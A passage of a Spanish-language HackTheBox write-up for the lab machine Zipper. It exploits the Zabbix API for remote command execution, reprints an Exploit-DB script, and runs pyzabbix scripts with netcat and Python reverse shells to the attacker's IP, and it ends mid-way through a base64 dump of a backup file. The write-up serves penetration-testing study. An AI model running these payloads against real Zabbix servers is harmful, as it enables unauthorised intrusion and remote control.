---
title: "HTB Writeup: Zipper"
date: 2019-02-22T18:55:03-06:00
tags: ["hackthebox","htb","zabbix","rce","linux"]
categories: ["htb","pentesting"]
draft: false

---
Esta máquina fue del tipo: Lee todo lo posible sobre la API, entiende bien lo que hace cada parámetro y ahora si, lánzalo.
<!--more-->

# Machine info
La información que tenemos de la maquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![zipper image](https://www.hackthebox.eu/storage/avatars/47cfc1b3b78883cf955f58c4464e0743_thumb.png) [zipper](https://www.hackthebox.eu/home/machines/profile/159) | [burmat](https://www.hackthebox.eu/home/users/profile/1453) | Linux | 10.10.10.108 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-zipper/cardinfo.png)

# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.108
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-04 16:27 CST
Initiating Ping Scan at 16:27
Scanning 10.10.10.108 [4 ports]
Completed Ping Scan at 16:27, 0.42s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:27
Scanning 10.10.10.108 [65535 ports]
Discovered open port 80/tcp on 10.10.10.108
Discovered open port 22/tcp on 10.10.10.108
SYN Stealth Scan Timing: About 45.42% done; ETC: 16:29 (0:00:37 remaining)
Discovered open port 10050/tcp on 10.10.10.108
Completed SYN Stealth Scan at 16:30, 121.94s elapsed (65535 total ports)
Nmap scan report for 10.10.10.108
Host is up (0.19s latency).
Not shown: 64555 closed ports, 977 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10050/tcp open  zabbix-agent

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 122.51 seconds
           Raw packets sent: 166729 (7.336MB) | Rcvd: 143139 (5.726MB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Corroboremos con `masscan`:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.108

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-04 22:20:25 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.108
Discovered open port 22/tcp on 10.10.10.108
Discovered open port 10050/tcp on 10.10.10.108
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos nmap con los parámetros habituales para la identificación de servicios y versiones:

```text
root@laptop:~# nmap -p22,80,10050 -n -sC -sV 10.10.10.108 --script vuln
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-04 16:35 CST
Nmap scan report for 10.10.10.108
Host is up (0.19s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
10050/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.71 seconds
```

- `-p22,80,10050` Ya conocemos a los sospechoso, estos 3 puertos abiertos.
- `-n` Sin resolver, nada con el dns.
- `-sC` Lanza los scripts de descubrimiento por defecto
- `-sV` Realiza la detección de versiones en cada puerto abierto
- `--script vuln` Lanza los scripts de vulnerabilidades

Una rápida googleada, no indicara que el servicio SSH no es vulnerable de acuerdo a la versión anunciada. De igual manera, la versión de apache no es vulnerable directamente a exploits.

# Gobuster + dirbusterDicListSmall

Lanzamos un gobuster para identificar todos los posibles archivos y directorios publicados por el servidor web:

```text
xbytemx@laptop:~/htb/zipper$ ~/tools/gobuster -u http://10.10.10.108/ -w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.108/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Extensions   : txt,php
[+] Timeout      : 10s
=====================================================
2019/01/04 16:50:01 Starting gobuster
=====================================================
/zabbix (Status: 301)
=====================================================
2019/01/04 17:20:20 Finished
=====================================================
```

- `-u http://10.10.10.108/` La url a la cual le realizaremos todas esas peticiones
- `-w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt` El diccionario que utilizaremos con las palabras que irán en las peticiones (GET /palabraaqui)
- `-s '200,204,301,302,307,403,500'` El tipo de códigos de respuesta que aceptaremos
- `-t 20` El numero de hilos o peticiones simultaneas que estaremos manejando, *ojo*, 20 porque mi conexión es lenta.
- `-x php,txt` El tipo de extensiones que buscaremos, es decir, si la palabra es hola, busco el directorio hola, el archivo hola.txt y hola.php

Como resultado encontramos la carpeta zabbix, indicándonos la relación entre **zabbix** y el nombre de la máquina, **zipper**.

# Exploring and enumering

Abrimos la pagina de [http://10.10.10.108/zabbix/](http://10.10.10.108/zabbix/) y tendremos:

![Zabbix Home](/img/htb-zipper/zabbix-www-root.png)

Como no tenemos credenciales, entramos como invitados y llegaremos al menu interno y limitado:

![Zabbix Dashboard](/img/htb-zipper/zabbix-www-dashboard.png)

Tras explorar un poco, veremos que no nos es posible hacer mucho. Pero encontraremos el siguiente mensaje dejado por algún admin:

![Zabbix Overview](/img/htb-zipper/zabbix-www-overview.png)

"Zapper's Backup Script - Exit Code" sobre **zabbix**, mientras que otros mensajes sobre **zipper**

Probamos el usuario zapper para ingresar en el login:

![Zabbix Login of Zapper](/img/htb-zipper/zabbix-www-zapper-login.png)

Parece que para el usuario zapper, el login vía GUI esta deshabilitado.

# Searchsploit

Buscamos en searchsploit vulnerabilidades relacionadas con zabbix:

```text
xbytemx@laptop:~/git/exploit-database$ ./searchsploit zabbix
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
 Exploit Title                                                                                                                        |  Path
                                                                                                                                      | (./)
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
Zabbix - (Authenticated) Remote Command Execution (Metasploit)                                                                        | exploits/linux/remote/29321.rb
Zabbix 1.1.2 - Multiple Remote Code Execution Vulnerabilities                                                                         | exploits/linux/dos/28775.pl
Zabbix 1.1.4/1.4.2 - 'daemon_start' Local Privilege Escalation                                                                        | exploits/linux/local/30839.c
Zabbix 1.1x/1.4.x - File Checksum Request Denial of Service                                                                           | exploits/unix/dos/31403.txt
Zabbix 1.6.2 Frontend - Multiple Vulnerabilities                                                                                      | exploits/php/webapps/8140.txt
Zabbix 1.8.1 - SQL Injection                                                                                                          | exploits/php/webapps/12435.txt
Zabbix 1.8.4 - 'popup.php' SQL Injection                                                                                              | exploits/php/webapps/18155.txt
Zabbix 2.0 < 3.0.3 - SQL Injection                                                                                                    | exploits/php/webapps/40353.py
Zabbix 2.0.1 - Session Extractor                                                                                                      | exploits/php/webapps/20087.py
Zabbix 2.0.5 - Cleartext ldap_bind_Password Password Disclosure (Metasploit)                                                          | exploits/php/webapps/36157.rb
Zabbix 2.0.8 - SQL Injection / Remote Code Execution (Metasploit)                                                                     | exploits/unix/webapps/28972.rb
Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution                                                                               | exploits/php/webapps/39937.py
Zabbix 2.2.x/3.0.x - SQL Injection                                                                                                    | exploits/php/webapps/40237.txt
Zabbix Agent - 'net.tcp.listen' Command Injection (Metasploit)                                                                        | exploits/freebsd/remote/16918.rb
Zabbix Agent 3.0.1 - 'mysql.size' Shell Command Injection                                                                             | exploits/linux/local/39769.txt
Zabbix Agent < 1.6.7 - Remote Bypass                                                                                                  | exploits/multiple/webapps/10431.txt
Zabbix Server - Arbitrary Command Execution (Metasploit)                                                                              | exploits/linux/remote/20796.rb
Zabbix Server - Multiple Vulnerabilities                                                                                              | exploits/multiple/webapps/10432.txt
-------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
```

Como podemos ver, existen bastantes vulnerabilidades asociadas a las diferentes versiones de zabbix, pero en este momento aun no sabemos que versión de zabbix tenemos. Eso lo resolvemos al entrar como guest y buscar los manuales de ayuda, los cuales hacen referencia a la versión 3.0, por lo que partimos de tener la versión 3.

En mi caso, elegí el exploit de `Zabbix 2.2 < 3.0.3 - API JSON-RPC Remote Code Execution`, el cual tiene el siguiente código:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Exploit Title: Zabbix RCE with API JSON-RPC
# Date: 06-06-2016
# Exploit Author: Alexander Gurin
# Vendor Homepage: http://www.zabbix.com
# Software Link: http://www.zabbix.com/download.php
# Version: 2.2 - 3.0.3
# Tested on: Linux (Debian, CentOS)
# CVE : N/A

import requests
import json
import readline

ZABIX_ROOT = 'http://192.168.66.2'	### Zabbix IP-address
url = ZABIX_ROOT + '/api_jsonrpc.php'	### Don't edit

login = 'Admin'		### Zabbix login
password = 'zabbix'	### Zabbix password
hostid = '10084'	### Zabbix hostid

### auth
payload = {
   	"jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
    	'user': ""+login+"",
    	'password': ""+password+"",
    },
   	"auth" : None,
    "id" : 0,
}
headers = {
    'content-type': 'application/json',
}

auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
auth = auth.json()

while True:
	cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
	if cmd == "" : print "Result of last command:"
	if cmd == "quit" : break

### update
	payload = {
		"jsonrpc": "2.0",
		"method": "script.update",
		"params": {
		    "scriptid": "1",
		    "command": ""+cmd+""
		},
		"auth" : auth['result'],
		"id" : 0,
	}

	cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))

### execute
	payload = {
		"jsonrpc": "2.0",
		"method": "script.execute",
		"params": {
		    "scriptid": "1",
		    "hostid": ""+hostid+""
		},
		"auth" : auth['result'],
		"id" : 0,
	}

	cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
	cmd_exe = cmd_exe.json()
	print cmd_exe["result"]["value"]
```

Nos pide 4 parámetros: IP, usuario, contraseña y hostid. Conocemos casi todos, menos **hostid**.

Vemos que un primer bloque del código se encarga de realizar la autenticación con la API de Zabbix, posterior entra a un ciclo While infinito en donde declara un prompt *cmd* y recibe la entrada del teclado. Si cmd no recibe nada, muestra en pantalla un mensaje, si recibe el string "quit" hace break del ciclo infinito.

Tenemos la siguiente sección es update, en donde prepara un payload donde el método es **script.update** con parámetros **scriptid** y **command** con nuestro comando.

La ultima sección, execute, llama al método **script.execute** y recibe de parámetros a **scriptid** y **hostid**. El resultado o response de ese request, lo imprime en pantalla.

Ahora necesitamos saber que hace cada función y que valores son validos en cada parámetro por lo que vamos a ...

# Zabbix API Documentation

La [documentación de la API](https://www.zabbix.com/documentation/3.0/manual/api) nos explica rápidamente algunos conceptos clave:

- Tenemos que autenticarnos y usar el token asignado durante su vigencia
- Tenemos 4 métodos principales para todos los tipos de objeto (get, create, update y delete)
- La documentación sobre el objeto script la encontramos [aquí](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object)

Ahí podemos entender un poco mas sobre el tipo de objeto script, que requiere de un nombre y un comando para poderse crear.

Sobre los métodos encontramos mas información en el [manual de referencia](https://www.zabbix.com/documentation/3.0/manual/api/reference/script) el cual nos explica sobre el método [script.update](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/update) y [script.execute](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/execute)

`script.update`, se encarga de actualizar los valores del objeto script y su único argumento mínimo es `scriptid`, seguido del nombre/valor a editar.
`script.execute`, se encarga de ejecutar el `scriptid` sobre el `hostid` seleccionado. Ambos parámetros son obligatorios.

Tras leer esto, llegue a la conclusión de no saber cuales eran mis hostid's y scriptid's en la maquina, por lo que nuevamente leyendo el manual de la API, encontré como conocerlo con [script.get](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/get) y [host.get](https://www.zabbix.com/documentation/3.0/manual/api/reference/host/get).

Ambos no requieren parámetros por lo que decidí realizar mi modificación al script original y utilizando en su lugar la API implementada en python3.

# PyZabbix

```python
#!/usr/bin/env python3
from pyzabbix import ZabbixAPI

api_address="http://10.10.10.108/zabbix/api_jsonrpc.php"

user="zapper"
password="zapper"

zapi = ZabbixAPI(api_address)
zapi.login(user, password)

for host in zapi.host.get():
    print("host name: {}, host id: {}".format(host['host'],host['hostid']))
    print(zapi.script.get(filter={"host": host['host']}))
```

El siguiente comando simplemente devuelve todos los hosts, y cada script en cada host. Su salida de ejemplo es la siguiente:

```text
host name: Zabbix, host id: 10105
[{'scriptid': '1', 'name': 'Ping', 'command': 'nc 10.10.13.18 4444 -e /bin/bash', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '2', 'name': 'Traceroute', 'command': '/usr/bin/traceroute {HOST.CONN} 2>&1', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '3', 'name': 'Detect operating system', 'command': 'sudo /usr/bin/nmap -O {HOST.CONN} 2>&1', 'host_access': '2', 'usrgrpid': '7', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}]
host name: Zipper, host id: 10106
[{'scriptid': '1', 'name': 'Ping', 'command': 'nc 10.10.13.18 4444 -e /bin/bash', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '2', 'name': 'Traceroute', 'command': '/usr/bin/traceroute {HOST.CONN} 2>&1', 'host_access': '2', 'usrgrpid': '0', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}, {'scriptid': '3', 'name': 'Detect operating system', 'command': 'sudo /usr/bin/nmap -O {HOST.CONN} 2>&1', 'host_access': '2', 'usrgrpid': '7', 'groupid': '0', 'description': '', 'confirmation': '', 'type': '0', 'execute_on': '1'}]
```

Como podemos ver tenemos dos Hosts, Zipper y Zabbix. Esto es importante, porque dependiendo del Host ID, sera donde se ejecute nuestro script.

# RCE to reverse shell

Ahora que sabemos un poco mas sobre el funcionamiento de la API y conocemos más de sus parámetros, podemos crear nuestro primer script en Zipper:

```python
#!/usr/bin/env python3
from pyzabbix import ZabbixAPI

api_address="http://10.10.10.108/zabbix/api_jsonrpc.php"

user="zapper"
password="zapper"
hostname = "Zipper"
hostid = "10106"

zapi = ZabbixAPI(api_address)
zapi.login(user, password)

scriptid = ""


get_scripts = zapi.script.get(filter={"host": hostname})
for script in get_scripts:
    if script['name'] == "miau script":
        scriptid = script['scriptid']

if scriptid == "":
    scriptid = zapi.script.create(name='miau script', command='id')['scriptids']

print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
```

Como salida tendremos lo siguiente:

```text
{'response': 'success', 'value': 'uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)\n'}
```

Ahora, usando una de las viejas conocidas para reverse shell, cargaremos el siguiente comando para hacer una reverse shell de netcat:

```python
#!/usr/bin/env python3
from pyzabbix import ZabbixAPI

api_address="http://10.10.10.108/zabbix/api_jsonrpc.php"

user="zapper"
password="zapper"
hostname = "Zipper"
hostid = "10106"

zapi = ZabbixAPI(api_address)
zapi.login(user, password)

scriptid = ""

revshell = "nc -e /bin/bash 10.10.12.83 3001"

get_scripts = zapi.script.get(filter={"host": hostname})
for script in get_scripts:
    if script['name'] == "miau script":
        scriptid = script['scriptid']
        zapi.script.update(scriptid=scriptid, command=revshell)

if scriptid == "":
    scriptid = zapi.script.create(name='miau script', command=revshell)['scriptids']

print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
```

Bastaría con iniciar un netcat para esperar la conexión:

```text
Shell1:
xbytemx@laptop:~$ ncat -klvnp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001

Shell2:
xbytemx@laptop:~$ python3 get_revsh.py

Shell1:
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:46448.
id
uid=103(zabbix) gid=104(zabbix) groups=104(zabbix)
ls -lah /
total 84K
drwxr-xr-x   1 root root 4.0K Jan 22 23:22 .
drwxr-xr-x   1 root root 4.0K Jan 22 23:22 ..
-rwxr-xr-x   1 root root    0 Jan 22 23:22 .dockerenv
drwxrwxrwx   2 1000 1000 4.0K Jan 22 23:34 backups
drwxr-xr-x   1 root root 4.0K Sep  8 07:21 bin
drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
drwxr-xr-x   5 root root  360 Jan 22 23:22 dev
drwxr-xr-x   1 root root 4.0K Jan 22 23:22 etc
drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
drwxr-xr-x   1 root root 4.0K Aug 21  2018 lib
drwxr-xr-x   2 root root 4.0K Aug 21  2018 media
drwxr-xr-x   2 root root 4.0K Aug 21  2018 mnt
drwxr-xr-x   2 root root 4.0K Aug 21  2018 opt
dr-xr-xr-x 139 root root    0 Jan  9 23:22 proc
drwx------   1 root root 4.0K Sep  8 07:33 root
drwxr-xr-x   1 root root 4.0K Sep  8 07:39 run
drwxr-xr-x   1 root root 4.0K Sep  8 07:19 sbin
drwxr-xr-x   2 root root 4.0K Aug 21  2018 srv
dr-xr-xr-x  13 root root    0 Jan  9 23:33 sys
drwxrwxrwt   1 root root 4.0K Jan  9 23:22 tmp
drwxr-xr-x   1 root root 4.0K Aug 21  2018 usr
drwxr-xr-x   1 root root 4.0K Sep  8 07:21 var
```

Oh, creo que estoy dentro de una instancia de docker.

# Escape from docker?

Estuve enumerando y enumerando la instancia de docker, hasta que me di cuenta de un detalle importantísimo de la configuración. El objeto script, tiene una propiedad especial llamada `execute_on`, la cual te permite ejecutar el script ya sea dentro del servidor de zabbix (docker) o sobre el cliente (el que tiene abierto el puerto 10050!), por lo que modificando las lineas 22 y 25 el script se ejecutará en el agente:

```python
#!/usr/bin/env python3
from pyzabbix import ZabbixAPI

api_address="http://10.10.10.108/zabbix/api_jsonrpc.php"

user="zapper"
password="zapper"
hostname = "Zipper"
hostid = "10106"

zapi = ZabbixAPI(api_address)
zapi.login(user, password)

scriptid = ""

revshell = "nc -e /bin/bash 10.10.12.83 3001"

get_scripts = zapi.script.get(filter={"host": hostname})
for script in get_scripts:
    if script['name'] == "miau script":
        scriptid = script['scriptid']
        zapi.script.update(scriptid=scriptid, execute_on="0", command=revshell)

if scriptid == "":
    scriptid = zapi.script.create(name='miau script', execute_on="0", command=revshell)['scriptids']

print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
```

Ahora tras ejecutarlo:

```text
xbytemx@laptop:~/htb/zipper$ python3 get_revsh.py
{'response': 'success', 'value': "nc: invalid option -- 'e'\nusage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]\n\t  [-m minttl] [-O length] [-P proxy_username] [-p source_port]\n\t  [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]\n\t  [-X proxy_protocol] [-x proxy_address[:port]] \t  [destination] [port]"}
```

Esto nos indica que ha sido exitoso nuestro cambio de servidor a agente, porque como vemos la versión de netcat instalada en el agente, no soporta la opción \-e. Aquí decidí cambiar a una python reverse shell, por lo que cambiamos la variable revshell:

```python
#!/usr/bin/env python3
from pyzabbix import ZabbixAPI

api_address="http://10.10.10.108/zabbix/api_jsonrpc.php"

user="zapper"
password="zapper"
hostname = "Zipper"
hostid = "10106"

zapi = ZabbixAPI(api_address)
zapi.login(user, password)

scriptid = ""

revshell = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.12.83\",3001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'"

get_scripts = zapi.script.get(filter={"host": hostname})
for script in get_scripts:
    if script['name'] == "miau script":
        scriptid = script['scriptid']
        zapi.script.update(scriptid=scriptid, execute_on="0", command=revshell)

if scriptid == "":
    scriptid = zapi.script.create(name='miau script', execute_on="0", command=revshell)['scriptids']

print(zapi.script.execute(hostid=hostid, scriptid=scriptid))
```

Volvemos a ejecutar y ahora tendremos una conexión hacia el listener de `ncat`:

```text
xbytemx@laptop:~$ ncat -nlvp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.108.
Ncat: Connection from 10.10.10.108:51910.
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
$ ls -lah /
total 948M
drwxr-xr-x  22 root   root   4.0K Sep  8 07:10 .
drwxr-xr-x  22 root   root   4.0K Sep  8 07:10 ..
drwxrwxrwx   2 zapper zapper 4.0K Jan 10 00:07 backups
drwxr-xr-x   2 root   root   4.0K Sep  8 06:51 bin
drwxr-xr-x   3 root   root   4.0K Sep  8 06:44 boot
drwxr-xr-x  18 root   root   3.8K Jan  9 23:22 dev
drwxr-xr-x  80 root   root   4.0K Oct  2 13:18 etc
drwxr-xr-x   3 root   root   4.0K Sep  8 06:44 home
lrwxrwxrwx   1 root   root     33 Sep  8 06:41 initrd.img -> boot/initrd.img-4.15.0-33-generic
lrwxrwxrwx   1 root   root     33 Sep  8 06:41 initrd.img.old -> boot/initrd.img-4.15.0-33-generic
drwxr-xr-x  20 root   root   4.0K Oct  2 13:18 lib
drwx------   2 root   root    16K Sep  8 06:38 lost+found
drwxr-xr-x   2 root   root   4.0K Sep  8 06:38 media
drwxr-xr-x   2 root   root   4.0K Sep  8 06:40 mnt
drwxr-xr-x   2 root   root   4.0K Sep  8 06:40 opt
dr-xr-xr-x 145 root   root      0 Jan  9 23:22 proc
drwx------   5 root   root   4.0K Sep  9 19:16 root
drwxr-xr-x  21 root   root    640 Jan  9 23:22 run
drwxr-xr-x   2 root   root   4.0K Oct  2 13:18 sbin
drwxr-xr-x   2 root   root   4.0K Sep  8 06:40 srv
-rw-------   1 root   root   948M Sep  8 06:38 swapfile
dr-xr-xr-x  13 root   root      0 Jan  9 23:33 sys
drwxrwxrwt   9 root   root   4.0K Jan 10 00:09 tmp
drwxr-xr-x  10 root   root   4.0K Sep  8 06:40 usr
drwxr-xr-x  11 root   root   4.0K Sep  8 06:40 var
lrwxrwxrwx   1 root   root     30 Sep  8 06:41 vmlinuz -> boot/vmlinuz-4.15.0-33-generic
lrwxrwxrwx   1 root   root     30 Sep  8 06:41 vmlinuz.old -> boot/vmlinuz-4.15.0-33-generic
```
# from zabbix to root a.k.a. privesc

Exploramos un poco la máquina:

```text
$ ls /home
zapper
$ ls -lah /home/zapper
total 48K
drwxr-xr-x 6 zapper zapper 4.0K Sep  9 19:12 .
drwxr-xr-x 3 root   root   4.0K Sep  8 06:44 ..
-rw------- 1 zapper zapper    0 Sep  8 13:44 .bash_history
-rw-r--r-- 1 zapper zapper  220 Sep  8 06:44 .bash_logout
-rw-r--r-- 1 zapper zapper 4.6K Sep  8 13:41 .bashrc
drwx------ 2 zapper zapper 4.0K Sep  8 06:45 .cache
drwxrwxr-x 3 zapper zapper 4.0K Sep  8 13:13 .local
-rw-r--r-- 1 zapper zapper  807 Sep  8 06:44 .profile
-rw-rw-r-- 1 zapper zapper   66 Sep  8 13:13 .selected_editor
drwx------ 2 zapper zapper 4.0K Sep  8 13:14 .ssh
-rw------- 1 zapper zapper   33 Sep  9 19:07 user.txt
drwxrwxr-x 2 zapper zapper 4.0K Sep  8 13:27 utils
$ ls /home/zapper/utils
backup.sh
zabbix-service
$ ls -lah /home/zapper/utils
total 20K
drwxrwxr-x 2 zapper zapper 4.0K Sep  8 13:27 .
drwxr-xr-x 6 zapper zapper 4.0K Sep  9 19:12 ..
-rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh
-rwsr-sr-x 1 root   root   7.4K Sep  8 13:05 zabbix-service
$ cat /home/zapper/utils/backup.sh
#!/bin/bash
#
# Quick script to backup all utilities in this folder to /backups
#
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
echo $?
```

Hemos dado con un script que genera backups de la carpeta utils, extraigamos el contenido de ese backup.

```text
$ ls -lah /backups
total 12K
drwxrwxrwx  2 zapper zapper 4.0K Jan 10 00:07 .
drwxr-xr-x 22 root   root   4.0K Sep  8 07:10 ..
-rw-rw-r--  1 zapper zapper 3.0K Jan 10 00:00 zapper_backup-2019-01-10.7z
$ base64 /backups/zapper_backup-2019-01-10.7z
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
